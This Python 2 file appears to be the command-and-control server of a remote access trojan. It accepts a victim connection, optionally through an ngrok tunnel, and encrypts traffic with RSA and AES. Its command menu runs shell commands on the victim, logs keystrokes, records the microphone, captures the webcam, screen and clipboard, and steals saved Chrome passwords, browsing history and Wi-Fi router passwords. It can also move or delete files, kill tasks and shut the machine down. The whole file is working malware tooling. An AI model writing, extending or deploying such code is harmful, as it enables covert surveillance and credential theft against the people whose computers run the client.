import os
import socket
from pyngrok import ngrok
import base64
import binascii
import struct
import random
import string
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import struct

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf


def send_one_message(sock, data):
    length = len(data)
    sock.sendall(struct.pack('!I', length))
    sock.sendall(data)


def recv_one_message(sock):
    lengthbuf = recvall(sock, 4)
    length, = struct.unpack('!I', lengthbuf)
    return recvall(sock, length)

class RSA_ENCRYPTION:

    def __init__(self):
        self.keyPair = RSA.generate(4096)

        self._pubKey = self.keyPair.publickey()
        self._pubKeyPEM = self._pubKey.exportKey()

        self.myPubKey = self._pubKeyPEM.decode('ascii')

        self.otherPubKey = ""



    def get_myPubKey(self):
        return self.myPubKey

    def process_otherPubKey(self, aotherPubKey):
        self.otherPubKey = RSA.import_key(aotherPubKey)


    def RSA_Encrypt(self, msg):
        encryptedMessage = ""
        encryptor = PKCS1_OAEP.new(self.otherPubKey)
        encryptedMessage += binascii.hexlify(encryptor.encrypt(msg))

        return encryptedMessage

    def RSA_Decrypt(self, encrypted):
        decryptor = PKCS1_OAEP.new(self.keyPair)
        decrypted = decryptor.decrypt(encrypted)
        return decrypted


class AES256:

    def __init__(self):
        letters = string.ascii_letters + string.digits
        self.key = (''.join(random.choice(letters) for i in range(16)))

    def encrypt(self, raw):
        BS = AES.block_size
        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

        raw = base64.b64encode(pad(raw).encode('utf8'))
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key=self.key, mode=AES.MODE_CFB, iv=iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    @staticmethod
    def _encrypt(raw, key):
        BS = AES.block_size
        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

        raw = base64.b64encode(pad(raw).encode('utf8'))
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key=key, mode=AES.MODE_CFB, iv=iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def encrypt_file(self, in_filename, out_filename=None, chunksize=64 * 1024):

        if not out_filename:
            out_filename = in_filename + '.enc'

        iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
        encryptor = AES.new(self.key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += ' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))

    @staticmethod
    def decrypt(enc, key):
        unpad = lambda s: s[:-ord(s[-1:])]

        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CFB, iv)
        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))

    @staticmethod
    def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):

        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]

        with open(in_filename, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)

            with open(out_filename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))

                outfile.truncate(origsize)

    def get_key(self):
        return self.key



portforward = False


while True:
    portforward_input = raw_input(str('\nWould you like to port forward over to ngrok server [y/n] -> '))

    if portforward_input.upper() == 'Y':
        portforward = True
        print "Port fowarding to remote ngrok server TRUE\n"
        break

    elif portforward_input.upper() == 'N':
        portforward == False
        print "Port forwarding to remote ngrok server FALSE\n"
        break

    else:
        print "Invalid input, try again\n"



host = socket.gethostbyname(socket.gethostname())
port = 22

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind a local socket to the port
server_address = ("", port)

sock.bind(server_address)
sock.listen(1)



# Open a ngrok tunnel to the socket

if portforward:
    ssh_tunnel = ngrok.connect(port, "tcp")
    print("ngrok tunnel \"{}\" -> \"tcp://127.0.0.1:{}/\"".format(ssh_tunnel, port))


# File path information
file_path = "C:\\Users\\Public"
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
extend = "\\"


known_hosts = []

list_of_commands = "---------------------------------------- List of commands ----------------------------------------\n" \
                   "\nview_cwd --------------- view current directory" \
                   "\ncustom_dir ------------- list files in selected directory" \
                   "\ndownload_file ---------- downloads file from client computer to host computer" \
                   "\nsend_file -------------- sends file from host computer to client computer" \
                   "\nsystem_info ------------ displays system information of client computer" \
                   "\nscreenshot ------------- takes screenshot of client computer and sends to host as .png file" \
                   "\ncopy_clipboard --------- copies clipboard of client computer and sends to host computer" \
                   "\nkey_logger ------------- listens to keyboard of client computer for set period of time (seconds)" \
                   "\nbrowser_password ------- gets saved passwords from Google Chrome" \
                   "\nbrowser_history -------- gets history from Google Chrome (Terminates chrome.exe if chrome is running)" \
                   "\nrouter_password --------- gets password of all known routers to computer" \
                   "\nwebcam ----------------- captures image from webcam" \
                   "\nlisten ----------------- listens on mic of client computer for set period of time (seconds)" \
                   "\nremove ----------------- removes file at given path from client computer" \
                   "\ncmd -------------------- executes command from command prompt on client computer" \
                   "\nkill ------------------- kills specified task on client computer" \
                   "\nshutdown --------------- remote shutdown of client computer" \
                   "\nexit ------------------- exits program"



while True:
    connection = None
    try:
        # Wait for a connection
        print("\nWaiting for a connection ...")
        conn, client_address = sock.accept()

        print("... connection established from {}".format(client_address))


        # Key Swap
        while True:
            keyPair = RSA.generate(4096)
            print ""
            print "Swapping keys ..."
            pubKey = keyPair.publickey()
            pubKeyPEM = pubKey.exportKey()
            privKeyPEM = keyPair.exportKey()
            send_one_message(conn, pubKeyPEM.encode())
            otherKey = recv_one_message(conn)
            otherKey = otherKey.decode()
            known_hosts.append(otherKey)
            print "Finished key exchange\n"
            break

        print("")
        print list_of_commands + "\n"
        # Receive the message, send a response
        while True:
            command = raw_input(str("Command >> "))
            command = hash(command)
            send_one_message(conn, str(command))
            print ""
            print "Sent Command"
            if int(float(command)) == 1231121288:


                e_files = recv_one_message(conn)
                e_files = e_files.decode()

                print ""
                print e_files

                print ""
                print "Recieved encrypted files"

                e_key = recv_one_message(conn)
                e_key = e_key

                print ""
                print "Recieved encrypted key"
                print ""
                decryptor = PKCS1_OAEP.new(keyPair)
                d_key = decryptor.decrypt(e_key)

                print ""
                print "Decrypted key"

                d_files = AES256.decrypt(e_files, d_key)

                print("Command output : ", d_files)

            elif int(float(command)) == -1333407573:

                print("")
                user_input = raw_input(str("Custom Dir : "))
                custom_dir_aes = AES256()

                euser_input = custom_dir_aes.encrypt(user_input)
                send_one_message(conn, str(euser_input).encode())

                print ""
                print "Encrypted user response sent"
                ae_key3 = custom_dir_aes.get_key()
                apubKey3 = RSA.import_key(known_hosts[0])
                encryptor3 = PKCS1_OAEP.new(apubKey3)
                e_key3 = encryptor3.encrypt(ae_key3)

                send_one_message(conn, e_key3)
                print ""
                print "Encrypted key sent"

                efiles3 = recv_one_message(conn)
                efiles3 = efiles3.decode()
                dfiles3 = AES256.decrypt(efiles3, custom_dir_aes.get_key())
                print ""
                print dfiles3

            # 'download_file'
            elif int(float(command)) == -1469341932:

                    e_key4 = recv_one_message(conn)

                    decryptor4 = PKCS1_OAEP.new(keyPair)
                    d_key4 = decryptor4.decrypt(e_key4)

                    filename = raw_input("Filename? [client] -> ")
                    filepath = raw_input("File Path? [client] -> ")
                    lcl_path = raw_input("Path to store? [host]")
                    lcl_name = raw_input("name to store? (add extension type) [host] -> ")
                    send_one_message(conn, filepath + extend + filename)


                    BUFFER_SIZE = 1024
                    with open(lcl_path + extend + "new_ " + filename, 'wb') as fw:
                        msg = recv_one_message(conn)
                        fsize = int(float(msg.decode('utf-8')))
                        rsize = 0

                        while True:
                            data = recv_one_message(conn)

                            rsize = rsize + len(data)
                            fw.write(data)
                            if rsize >= fsize:
                                print('Breaking from file write')
                                break
                        print("Received..")

                    AES256.decrypt_file(d_key4, lcl_path + extend + "new_ " + filename, lcl_path + extend + lcl_name)
                    os.remove(lcl_path + extend + "new_ " + filename)



            # 'send_file'
            elif int(float(command)) == 1170837110:


                lcl_name2 = raw_input("Filename? [host] -> ")
                lcl_path2 = raw_input("File Path [host] -> ")
                clientpath = raw_input(str("Path to store? [client] -> "))
                clientname = raw_input(str("name to store? (add extension type) [client] -> "))


                esize = os.path.getsize(lcl_path2 + extend + lcl_name2)
                fsize = str(esize)
                print type(fsize)
                print ""
                send_one_message(conn, fsize.encode())

                combined = str(clientpath) + "\\" + str(clientname)

                send_one_message(conn, combined.encode())

                print "\n Sent"

                send_file_aes = AES256()

                ae_key5 = send_file_aes.get_key()
                apubKey5 = RSA.import_key(known_hosts[0])
                encryptor5 = PKCS1_OAEP.new(apubKey5)
                e_key5 = encryptor5.encrypt(ae_key5)

                send_one_message(conn, e_key5)
                print "\n Sent encrypted key"

                send_file_aes.encrypt_file(lcl_path2 + "\\" + lcl_name2)

                BUFFER_SIZE = 1024
                with open(lcl_path2 + extend + lcl_name2 + ".enc", 'rb') as fs:
                    data = fs.read(BUFFER_SIZE)

                    while data:
                        conn.send(data)
                        data = fs.read(BUFFER_SIZE)

                os.remove(lcl_path2 + extend + lcl_name2 + ".enc")



            # system_info
            elif int(float(command)) == -1229269459:
                esys_info = recv_one_message(conn)
                esys_info = esys_info.decode()
                print ""
                print "recieved encrypted data"
                print(esys_info)

                e_key2 = recv_one_message(conn)
                print ""
                print "Recieved encrypted key"
                print ""
                decryptor2 = PKCS1_OAEP.new(keyPair)
                d_key2 = decryptor2.decrypt(e_key2)

                sys_info = AES256.decrypt(esys_info, d_key2)

                print sys_info



            # 'screenshot'
            elif int(float(command)) == -665195066:

                e_key6 = recv_one_message(conn)
                print "\nRecieved encrypted key"

                decryptor6 = PKCS1_OAEP.new(keyPair)
                d_key6 = decryptor6.decrypt(e_key6)
                print "\nDecrypted encrypted key"

                path = 'C:\\Users\\jlemm\\OneDrive\\Pictures'
                filename2 = raw_input(str("What would you like to name file? (add extension '.png') -> "))

                BUFFER_SIZE = 1024
                with open(path + extend + "e_" + filename2, 'wb') as fw:
                    msg = recv_one_message(conn)
                    fsize = int(float(msg.decode('utf-8')))
                    rsize = 0

                    while True:
                        data = recv_one_message(conn)

                        rsize = rsize + len(data)
                        fw.write(data)
                        if rsize >= fsize:
                            print('Breaking from file write')
                            break
                    print("Received..")

                AES256.decrypt_file(d_key6, path + extend + "e_" + filename2, path + extend + filename2)
                os.remove(path + extend + "e_" + filename2)


            # 'copy_clipboard'
            elif int(float(command)) == -1857523954:
                e_key7 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor7 = PKCS1_OAEP.new(keyPair)
                d_key7 = decryptor7.decrypt(e_key7)

                print "\nDecrypted encrypted key"

                epasted_data = recv_one_message(conn)

                print "\nRecieved encrypted data"

                pasted_data = AES256.decrypt(epasted_data, d_key7)

                print "\nDecrypted data"

                print "Clipboard info: \n"
                print pasted_data

            # 'key_logger'
            elif int(float(command)) == -251284458:
                e_key8 = recv_one_message(conn)

                print "\nRecieved Encrypted key"
                decryptor8 = PKCS1_OAEP.new(keyPair)
                d_key8 = decryptor8.decrypt(e_key8)

                print "\nDecrypted encrypted key"

                time_iteration = raw_input(str("How long would you like to listen to keyboard? (secs) -> "))


                lcl_path3 = raw_input(str("Enter path to store [host] -> "))
                lcl_name3 = raw_input(str("Name to store (enter .txt at end) -> "))

                send_one_message(conn, time_iteration)

                print "\nSent duration"

                BUFFER_SIZE = 1024
                with open(lcl_path3 + extend + "e_" + lcl_name3 + ".enc", 'wb') as fw:
                    msg = recv_one_message(conn)
                    fsize = int(float(msg.decode('utf-8')))
                    rsize = 0

                    while True:
                        data = recv_one_message(conn)

                        rsize = rsize + len(data)
                        fw.write(data)
                        if rsize >= fsize:
                            print('Breaking from file write')
                            break
                    print("Received..")

                AES256.decrypt_file(d_key8, lcl_path3 + extend + "e_" + lcl_name3 + ".enc", lcl_path3 + extend + lcl_name3)
                os.remove(lcl_path3 + extend + "e_" + lcl_name3 + ".enc")

            # 'remove'
            elif int(float(command)) == 1720931438:
                remove_AES = AES256()

                ae_key9 = remove_AES.get_key()
                apubKey9 = RSA.import_key(known_hosts[0])
                encryptor9 = PKCS1_OAEP.new(apubKey9)
                e_key9 = encryptor9.encrypt(ae_key9)

                send_one_message(conn, e_key9)

                print "\nSent encrypted key"

                path3 = raw_input(str("Path to file you like to remove (add extension type to filename) [client] -> "))
                epath3 = remove_AES.encrypt(path3)
                send_one_message(conn, epath3)

                print "\nSent encrypted data"

                status = recv_one_message(conn)
                print "\n" + str(status)

            # 'shutdown'
            elif int(float(command)) == 1763366166:
                shutdown_AES = AES256()

                ae_key10 = shutdown_AES.get_key()
                apubKey10 = RSA.import_key(known_hosts[0])
                encryptor10 = PKCS1_OAEP.new(apubKey10)
                e_key10 = encryptor10.encrypt(ae_key10)

                send_one_message(conn, e_key10)

                print "\nSent encrypted data"

                status = recv_one_message(conn)

                print status


            # 'listen'
            elif int(float(command)) == -783645889:
                e_key11 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor11 = PKCS1_OAEP.new(keyPair)
                d_key11 = decryptor11.decrypt(e_key11)
                print "\nDecrypted encrypted key"

                RECORD_SECONDS = raw_input("How long would you like to listen on mic -> ")

                path4 = raw_input("Path to store file -> ")
                filename4 = raw_input("Name for file (add .wav at end) -> ")

                send_one_message(conn, RECORD_SECONDS)
                print "\nSent duration"

                BUFFER_SIZE = 1024
                with open(path4 + extend + "e_" + filename4 + ".enc", 'wb') as fw:
                    msg = recv_one_message(conn)
                    fsize = int(float(msg.decode('utf-8')))
                    rsize = 0

                    while True:
                        data = recv_one_message(conn)

                        rsize = rsize + len(data)
                        fw.write(data)
                        if rsize >= fsize:
                            print('Breaking from file write')
                            break
                    print("Received..")

                AES256.decrypt_file(d_key11, path4 + extend + "e_" + filename4 + ".enc",
                                    path4 + extend + filename4)
                os.remove(path4 + extend + "e_" + filename4 + ".enc")


            elif int(float(command)) == 1555112929:
                e_key12 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor12 = PKCS1_OAEP.new(keyPair)
                d_key12 = decryptor12.decrypt(e_key12)
                print "\nDecrypted encrypted key"

                filename6 = raw_input(str("Name of file to store (add .jpg to end) -> "))
                path6 = raw_input(str("Path you would like to store -> "))

                BUFFER_SIZE = 1024
                with open(path6 + extend + "e_" + filename6 + ".enc", 'wb') as fw:
                    msg = recv_one_message(conn)
                    fsize = int(float(msg.decode('utf-8')))
                    rsize = 0

                    while True:
                        data = recv_one_message(conn)

                        rsize = rsize + len(data)
                        fw.write(data)
                        if rsize >= fsize:
                            print('Breaking from file write')
                            break
                    print("Received..")

                AES256.decrypt_file(d_key12, path6 + extend + "e_" + filename6 + ".enc",
                                    path6 + extend + filename6)
                os.remove(path6 + extend + "e_" + filename6 + ".enc")

            # 'browser_password'
            elif int(float(command)) == 948019784:
                e_key13 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor13 = PKCS1_OAEP.new(keyPair)
                d_key13 = decryptor13.decrypt(e_key13)
                print "\nDecrypted encrypted key"


                ebrowser_password  = recv_one_message(conn)
                browser_password = AES256.decrypt(ebrowser_password, d_key13)
                print "\n\n" + browser_password

            elif int(float(command)) == -120590662:
                e_key15 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor15 = PKCS1_OAEP.new(keyPair)
                d_key15 = decryptor15.decrypt(e_key15)
                print "\nDecrypted encrypted key"

                ebrowser_history = recv_one_message(conn)
                browser_history = AES256.decrypt(ebrowser_history, d_key15)
                print "\n\n" + browser_history + "\n\n"

            # 'router_passowrd'
            elif int(float(command)) == 2083072854:
                e_key14 = recv_one_message(conn)
                print "\nRecieved encrypted key"
                decryptor14 = PKCS1_OAEP.new(keyPair)
                d_key14 = decryptor14.decrypt(e_key14)
                print "\nDecrypted encrypted key"

                erouter_password = recv_one_message(conn)
                router_password = AES256.decrypt(erouter_password, d_key14)

                print "\n\n\n\n" + router_password + "\n\n"

            # 'cmd'
            elif int(float(command)) == 401875051:
                cmd_AES = AES256()

                ae_key16 = cmd_AES.get_key()
                apubKey16 = RSA.import_key(known_hosts[0])
                encryptor16 = PKCS1_OAEP.new(apubKey16)
                e_key16 = encryptor16.encrypt(ae_key16)

                send_one_message(conn, e_key16)

                cmd = raw_input("Enter in cmd command to execute on client -> ")

                send_one_message(conn, cmd_AES.encrypt(cmd))

                eoutput = recv_one_message(conn)
                output = cmd_AES.decrypt(eoutput, cmd_AES.get_key())

                print output

            # 'kill'
            elif int(float(command)) == -1346507244:
                kill_AES = AES256()

                ae_key17 = kill_AES.get_key()
                apubKey17 = RSA.import_key(known_hosts[0])
                encryptor17 = PKCS1_OAEP.new(apubKey17)
                e_key17 = encryptor17.encrypt(ae_key17)

                send_one_message(conn, e_key17)

                task = raw_input("Enter in task you would like to kill on client computer -> ")

                send_one_message(conn, kill_AES.encrypt(task))

                eoutput = recv_one_message(conn)
                output = kill_AES.decrypt(eoutput, kill_AES.get_key())



            elif int(float(command)) == 603295412:
                print "Exiting ... "
                break

            else:
                print("")
                print("Command not recognized ")
        break
    except KeyboardInterrupt:
        print(" Shutting down server.")

        if connection:
            connection.close()
        break

sock.close()